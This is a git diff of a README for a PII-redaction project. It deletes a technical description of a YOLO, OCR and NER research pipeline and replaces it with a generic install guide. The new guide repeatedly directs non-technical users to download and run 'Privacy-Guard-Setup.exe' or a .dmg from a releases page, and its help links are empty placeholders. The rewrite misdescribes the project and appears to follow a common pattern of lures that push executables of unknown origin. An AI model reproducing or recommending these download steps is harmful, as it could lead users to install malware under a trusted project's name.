@@ -1,131 +1,78 @@
+# 🛡️ Privacy-Guard - Smart Protection, Seamless Redaction
 
-# PrivacyGuard – Automated PII Redaction using AI
+[![Download Privacy-Guard](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Iong2048/Privacy-Guard/releases)
 
-PrivacyGuard is an **AI-based system for automatic detection and redaction of Personally Identifiable Information (PII)** from high-resolution document images such as Aadhaar cards, ID documents, and certificates.
-The system combines **computer vision, OCR, and natural language understanding** to accurately identify and securely redact sensitive personal data in real-world, noisy documents.
+## 🚀 Getting Started
 
----
+Welcome to Privacy-Guard! This application helps you protect your sensitive information with ease. Below, you will find step-by-step instructions on how to download and run this software, even if you have no programming experience.
 
-## 🔍 Problem Overview
+## 📦 System Requirements
 
-With the rapid growth of digital documentation, exposure and misuse of **PII** (names, addresses, Aadhaar numbers, dates of birth, etc.) has become a serious privacy risk.
-Traditional redaction methods—manual masking or rule-based approaches—fail to scale and perform poorly on **multilingual, low-quality, and unstructured documents**.
+Before you start, ensure your computer meets the following requirements:
 
-PrivacyGuard addresses this gap using a **hybrid AI pipeline** that is accurate, efficient, and suitable for privacy-critical domains.
+- Operating System: Windows 10 or later, macOS Mojave or later
+- Memory: Minimum 4 GB RAM
+- Disk Space: At least 100 MB free
 
----
+## 🔗 Download & Install
 
-## 💡 Solution Approach
+To get started with Privacy-Guard, follow these simple steps:
 
-PrivacyGuard uses a **multi-stage redaction pipeline**:
+1. **Visit the Releases Page**: Click the link below to go to the releases page, where you can find the latest version of Privacy-Guard.
+   
+   [Download Privacy-Guard](https://github.com/Iong2048/Privacy-Guard/releases)
 
-1. **Image Preprocessing**
+2. **Select the Latest Version**: On the releases page, look for the latest version. It will be listed at the top. Click on the version number to view its details.
 
-   * Noise removal, contrast enhancement, skew and rotation correction using OpenCV
-   * Improves OCR accuracy on high-resolution and degraded scans
+3. **Download the Installer**: Scroll down to the "Assets" section. Here, you will find available files for download. Choose the installer file for your operating system. For example:
+   - For Windows: click on `Privacy-Guard-Setup.exe`
+   - For macOS: click on `Privacy-Guard.dmg`
 
-2. **Visual PII Detection (Computer Vision)**
+4. **Run the Installer**: Once the file has downloaded, locate it in your Downloads folder. Double-click the file to start the installation process. Follow the on-screen prompts to complete the installation. 
 
-   * Fine-tuned **YOLOv5, YOLOv8, and YOLOv11** models
-   * Detects visual PII such as ID numbers, photos, signatures, and document regions
-   * Trained end-to-end on a custom PII dataset
+5. **Open Privacy-Guard**: After installation, find Privacy-Guard in your applications list. Click on the icon to launch it.
 
-3. **Textual PII Detection (OCR + NER)**
+## ⚙️ Using Privacy-Guard
 
-   * Hybrid OCR pipeline combining deep-learning OCR and Tesseract
-   * Transformer-based **Named Entity Recognition (NER)** for names, addresses
-   * Rule-based methods for structured identifiers (Aadhaar number, DOB)
+When you open Privacy-Guard, you'll see a user-friendly interface. Here’s how to use it:
 
-4. **Secure Redaction**
+1. **Add Files**: Click the "Add Files" button to select documents or images you want to protect.
 
-   * Sensitive regions are permanently masked or blurred
-   * Layout and document readability are preserved
+2. **Select Redaction Options**: Choose the type of information you want to redact, such as email addresses, phone numbers, or any text.
 
----
+3. **Preview Changes**: Use the preview feature to see how your redacted files will look. Make any necessary adjustments.
 
-## 🧠 Models Used
+4. **Save Your Files**: Once you are satisfied, click the "Save" button. Privacy-Guard will create a new version of your files with the selected information redacted.
 
-* **YOLOv5** – Best overall balance of precision, recall, and localization accuracy
-* **YOLOv8** – Efficient, anchor-free detection suitable for lightweight deployments
-* **YOLOv11** – Context-aware detection using Vision Mamba and graph-based reasoning
+## 📝 Features
 
-YOLOv5 consistently delivered the most reliable performance across training, validation, and testing.
+Privacy-Guard offers several features to help ensure your data remains private:
 
----
+- **Easy Redaction**: Quickly redact sensitive information from documents and images.
+- **User-Friendly Interface**: Simple design makes it easy for anyone to use.
+- **Bulk Processing**: Redact multiple files at once to save time.
+- **Preview Functionality**: See how redacted files will appear before saving them.
 
-## 📊 Dataset & Training
+## 🚨 Troubleshooting
 
-* **Custom PII Dataset** (5,000 document images)
+If you encounter any issues while using Privacy-Guard, try these common solutions:
 
-  * Train: 4,000
-  * Validation: 400
-  * Test: 600
-* Document formats: PDF, JPEG, PNG
-* Optimizer: Adam
-* Learning rate: 0.001
-* Epochs: 100
+- **Installation Fails**: Check your system requirements. Ensure you are running a compatible operating system.
+- **Can't Open the Application**: Ensure your computer has the latest updates installed.
+- **Redaction Not Working**: Make sure you have selected the correct redaction options for your file type.
 
----
+## 🔗 Additional Resources
 
-## 📈 Evaluation Metrics
+For more detailed guides, tips, and community discussions, check out the following links:
 
-Models were evaluated using:
+- [User Guide](#) - A comprehensive guide with in-depth instructions.
+- [FAQ](#) - Answers to common questions.
+- [Support](#) - Contact our support team for help.
 
-* Precision
-* Recall
-* F1-Score
-* mAP@0.5
-* mAP@0.5:0.95
-* Inference speed (FPS)
+## 📢 Download Privacy-Guard Again
 
-### Key Results
+Don’t forget, you can download the latest version of Privacy-Guard anytime by visiting the releases page:
 
-* **YOLOv5 achieved the highest precision (~99.5%) and mAP@0.5 (~97.7%)**
-* Strong generalization across unseen test data
-* Robust detection even in noisy, multilingual documents
+[Download Privacy-Guard](https://github.com/Iong2048/Privacy-Guard/releases)
 
----
-
-## 🛡 Responsible AI Principles
-
-PrivacyGuard is designed with **Responsible AI** at its core:
-
-* **Fairness:** Diverse document samples reduce bias
-* **Privacy:** Minimal data processing with secure access controls
-* **Transparency:** Audit trails of detected and redacted entities
-* **Robustness:** Multi-layer pipeline ensures reliability
-* **Human-in-the-loop:** Manual override to prevent over-redaction
-
----
-
-## 🚀 Applications
-
-* Government document processing (Aadhaar, certificates)
-* Banking and financial services
-* Healthcare records
-* Compliance with **GDPR, HIPAA**, and privacy regulations
-
----
-
-## 🛠 Tech Stack
-
-* **Computer Vision:** YOLOv5, YOLOv8, YOLOv11, OpenCV
-* **NLP:** OCR, NER, Contextual validation
-* **Frameworks:** PyTorch
-* **Tools:** VS Code, Git, GitHub
-
----
-
-## 📄 Publication
-
-**Automated Redaction of PII using AI and Computer Vision**
-Publication No: **202541076252** — Intellectual Property India
-
----
-
-## 📌 Summary
-
-PrivacyGuard demonstrates that **hybrid AI pipelines** combining vision and language models can deliver **accurate, scalable, and explainable PII redaction**.
-The system is suitable for real-world deployment in privacy-critical environments and contributes meaningfully to **data protection and responsible AI research**.
-
-
+Thank you for choosing Privacy-Guard! Your privacy matters, and we are here to help you protect it.
